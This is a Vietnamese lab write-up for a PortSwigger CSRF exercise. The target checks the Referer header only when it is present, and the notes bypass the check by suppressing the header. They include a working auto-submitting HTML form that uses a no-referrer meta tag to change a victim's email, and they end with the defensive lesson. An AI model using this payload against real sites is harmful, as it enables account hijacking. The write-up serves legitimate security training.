![[csrf-referer-present.png]]
-mô tả lab: chức năng đổi email có check `Referer`, nhưng chỉ check KHI header đó tồn tại. Mình xóa luôn header là qua.

> [!NOTE]
> -link lab: https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present
> -test bằng `wiener:peter`, victim xem exploit là đổi email

### hướng giải
- [ ] mình bắt request đổi email của mình, sau đó quan sát gói tin này, mình thấy body là `email=...&csrf=...` bình thường
- [ ] mình thử bỏ `csrf` đi thì vẫn bị chặn, nhưng mình thử xóa luôn header `Referer` thì request lại chạy
- [ ] => nên mình đoán server code kiểu `if Referer exists -> check`, không có thì skip luôn. Vậy mình chỉ cần gửi request không kèm Referer là bypass được

### giải
-bước 1: mình tạo file exploit trên exploit-server, dùng `<meta name="referrer" content="never">` để trình duyệt không gửi Referer:
```html
<html>
<head><meta name="referrer" content="never"></head>
<body>
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="pwned@evil.com" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```
![[csrf-referer-present-exploit.png]]
-sau khi quan sát gói tin victim gửi đi này, mình thấy nó không có header `Referer`, server không check gì, email đổi luôn.

-bước 2: mình bấm `Deliver exploit to victim` rồi đợi 1 lúc, vào lại thấy email victim đã đổi là solve.

> [!NOTE]
> -bài học của mình: check Referer mà cho phép thiếu header thì coi như không check. Phải bắt buộc có + whitelist đúng domain.
